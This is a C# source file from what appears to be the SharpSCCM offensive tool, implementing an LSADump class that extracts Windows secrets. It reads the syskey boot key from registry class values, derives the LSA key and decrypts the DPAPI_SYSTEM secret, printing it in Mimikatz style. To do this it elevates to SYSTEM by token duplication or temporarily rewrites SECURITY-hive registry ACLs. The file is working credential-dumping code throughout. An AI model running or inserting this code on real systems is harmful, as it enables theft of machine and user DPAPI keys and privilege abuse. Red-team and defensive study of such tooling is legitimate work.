﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using System.Security.AccessControl;

namespace SharpSCCM
{
    public class LSADump
    {
        public static List<byte[]> GetDPAPIKeys(bool show = false, bool reg = false)
        {
            // retrieves the "DPAPI_SYSTEM" LSA secret wuth the GetLSASecret() function,
            //  returning a list of @(machineDPAPI, userDPAPI)
            //  also displays the full and m/u secrets a la Mimikatz

            List<byte[]> dpapiKeys = new List<byte[]>();

            byte[] dpapiKeyFull;
            if (reg)
            {
                dpapiKeyFull = GetLSASecret("DPAPI_SYSTEM", reg);
            }
            else
            {
                dpapiKeyFull = GetLSASecret("DPAPI_SYSTEM");
            }

            byte[] dpapiKeyMachine = new byte[20];
            byte[] dpapiKeyUser = new byte[20];

            Array.Copy(dpapiKeyFull, 0, dpapiKeyMachine, 0, 20);
            Array.Copy(dpapiKeyFull, 20, dpapiKeyUser, 0, 20);

            dpapiKeys.Add(dpapiKeyMachine);
            dpapiKeys.Add(dpapiKeyUser);

            if (show)
            {
                Console.WriteLine("[+] Secret: DPAPI_SYSTEM");
                Console.WriteLine("    full: {0}", BitConverter.ToString(dpapiKeyFull).Replace("-", ""));
                Console.WriteLine("     m/u: {0} / {1}", BitConverter.ToString(dpapiKeyMachine).Replace("-", ""), BitConverter.ToString(dpapiKeyUser).Replace("-", ""));
            }

            return dpapiKeys;
        }

        public static byte[] GetLSASecret(string secretName, bool reg = false)
        {
            // elevates to SYSTEM, retrieves the LSA decryption key (GetLSAKey()),
            //  and uses that to decrypt the given "secretName" LSA secret

            // NOTE: right now only the "DPAPI_SYSTEM" LSA secret is implemented, but others would be trivial

            bool alreadySystem = false;

            string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;   // Get current user context
            RegistrySecurity originalAcl = new RegistrySecurity();                              // Create a new ACL object to store the original registry key ACL
            RegistrySecurity newAcl = new RegistrySecurity();                                   // Create a new ACL object to store the modified registry key ACL
            RegistryAccessRule newRule;
            RegistrySecurity revertedAcl = new RegistrySecurity();                              // Create a new ACL object to store the reverted registry key ACL

            // Registry keys that require permissions modification
            string[] LsaRegKeys = new string[] 
                { 
                    "SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM\\CurrVal\\",
                    "SECURITY\\Policy\\PolEKList"
                };


            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("[!] You need to be in high integrity to extract LSA secrets!");
                return null;
            }
            else
            {
                // Check if we're already system
                if (currentName == "NT AUTHORITY\\SYSTEM")
                {
                    alreadySystem = true;
                }

                // If we're not system and we want to escalate
                else if ((reg == false) && (alreadySystem == false))
                {
                    // elevated but not system, so gotta GetSystem() first
                    Console.WriteLine("[+] Elevating to SYSTEM via token duplication for LSA secret retrieval");
                    Helpers.GetSystem();
                }

                // If we're not system and we don't want to escalate, modify the LSA secrets reg key permissions instead
                else if ((reg == true) && (alreadySystem == false))
                {
                    foreach (string key in LsaRegKeys)
                    {
                        Console.WriteLine("[+] Modifying permissions on registry key: {0}", key);

                        // Backup the current ACL
                        originalAcl = Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ReadPermissions).GetAccessControl();

                        // Copy the current ACL into a new ACL
                        newAcl = originalAcl;

                        // Create a new rule that grants the current user read permissions on the key
                        newRule = new RegistryAccessRule(currentName, RegistryRights.ReadKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow);

                        // Append the new rule to the new ACL
                        newAcl.AddAccessRule(newRule);

                        // Apply the new ACL to the key
                        Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ChangePermissions).SetAccessControl(newAcl);
                    }
                }
            }

            // get the LSA key needed to secret decryption
            byte[] LSAKey = GetLSAKey();

            string keyPath = String.Format("SECURITY\\Policy\\Secrets\\{0}\\CurrVal", secretName);
            byte[] keyData = Helpers.GetRegKeyValue(keyPath);

            byte[] keyEncryptedData = new byte[keyData.Length - 28];
            Array.Copy(keyData, 28, keyEncryptedData, 0, keyEncryptedData.Length);

            // calculate the temp key by using the LSA key to calculate the Sha256 hash on the first 32 bytes
            //  of the extracted secret data
            byte[] keyEncryptedDataEncryptedKey = new byte[32];
            Array.Copy(keyEncryptedData, 0, keyEncryptedDataEncryptedKey, 0, 32);
            byte[] tmpKey = Crypto.LSASHA256Hash(LSAKey, keyEncryptedDataEncryptedKey);

            // use the temp key to decrypt the rest of the plaintext
            byte[] keyEncryptedDataRemainder = new byte[keyEncryptedData.Length - 32];
            Array.Copy(keyEncryptedData, 32, keyEncryptedDataRemainder, 0, keyEncryptedDataRemainder.Length);
            byte[] IV = new byte[16];
            byte[] keyPathPlaintext = Crypto.LSAAESDecrypt(tmpKey, keyEncryptedDataRemainder);

            // Revert reg key permissions to the original ACL
            if (reg)
            {
                foreach (string key in LsaRegKeys)
                {
                    Console.WriteLine("[+] Reverting permissions on registry key: {0}", key);
                    revertedAcl = newAcl;
                    newRule = new RegistryAccessRule(currentName, RegistryRights.ReadKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow);
                    revertedAcl.RemoveAccessRule(newRule);
                    Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions).SetAccessControl(revertedAcl);
                }
                Console.WriteLine();
            }

            if ((!alreadySystem) && (!reg))
            {
                Console.WriteLine("[+] RevertToSelf()\r\n");
                Interop.RevertToSelf();
            }

            if (secretName.Equals("DPAPI_SYSTEM"))
            {
                byte[] secret = new byte[40];
                Array.Copy(keyPathPlaintext, 20, secret, 0, 40);
                return secret;
            }
            else
            {
                Console.WriteLine("[!] LSA Secret '{0}' not yet implemented!", secretName);
                return null;
            }
        }

        public static byte[] GetLSAKey()
        {
            // retrieves the boot key (syskey) and uses it to retrieve the key used to encrypt LSA secrets

            byte[] bootkey = GetBootKey();

            byte[] LSAKeyEncryptedStruct = Helpers.GetRegKeyValue(@"SECURITY\Policy\PolEKList");
            byte[] LSAEncryptedData = new byte[LSAKeyEncryptedStruct.Length - 28];
            Array.Copy(LSAKeyEncryptedStruct, 28, LSAEncryptedData, 0, LSAEncryptedData.Length);

            // calculate the temp key by using the boot key to calculate the Sha256 hash on the first 32 bytes
            //  of the LSA key data
            byte[] LSAEncryptedDataEncryptedKey = new byte[32];
            Array.Copy(LSAEncryptedData, 0, LSAEncryptedDataEncryptedKey, 0, 32);
            byte[] tmpKey = Crypto.LSASHA256Hash(bootkey, LSAEncryptedDataEncryptedKey);

            // use the temp key to decrypt the rest of the LSA struct
            byte[] LSAEncryptedDataRemainder = new byte[LSAEncryptedData.Length - 32];
            Array.Copy(LSAEncryptedData, 32, LSAEncryptedDataRemainder, 0, LSAEncryptedDataRemainder.Length);
            byte[] IV = new byte[16];
            byte[] LSAKeyStructPlaintext = Crypto.LSAAESDecrypt(tmpKey, LSAEncryptedDataRemainder);

            byte[] LSAKey = new byte[32];
            Array.Copy(LSAKeyStructPlaintext, 68, LSAKey, 0, 32);

            return LSAKey;
        }

        public static byte[] GetBootKey()
        {
            // returns the system boot key (aka syskey) that's later used to calculate the LSA key

            StringBuilder scrambledKey = new StringBuilder();

            foreach (string key in new string[] { "JD", "Skew1", "GBG", "Data" })
            {
                string keyPath = String.Format("SYSTEM\\CurrentControlSet\\Control\\Lsa\\{0}", key);
                StringBuilder classVal = new StringBuilder(1024);
                int len = 1024;
                int result = 0;
                IntPtr hKey = IntPtr.Zero;
                IntPtr dummy = IntPtr.Zero;

                // open the specified key with read (0x19) privileges
                //  0x80000002 == HKLM
                result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
                if (result != 0)
                {
                    int error = Marshal.GetLastWin32Error();
                    string errorMessage = new Win32Exception((int)error).Message;
                    Console.WriteLine("[!] Error opening {0} ({1}) : {2}", keyPath, error, errorMessage);
                    return null;
                }

                result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
                if (result != 0)
                {
                    int error = Marshal.GetLastWin32Error();
                    string errorMessage = new Win32Exception((int)error).Message;
                    Console.WriteLine("[!] Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
                    return null;
                }
                Interop.RegCloseKey(hKey);

                scrambledKey.Append(classVal);
            }

            // reference: https://github.com/brandonprry/gray_hat_csharp_code/blob/e1d5fc2a497ae443225d840718adde836ffaeefe/ch14_reading_offline_hives/Program.cs#L74-L82
            byte[] skey = Helpers.StringToByteArray(scrambledKey.ToString());
            byte[] descramble = new byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
                                             0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };

            byte[] bootkey = new byte[16];
            for (int i = 0; i < bootkey.Length; i++)
                bootkey[i] = skey[descramble[i]];

            return bootkey;
        }
    }
}
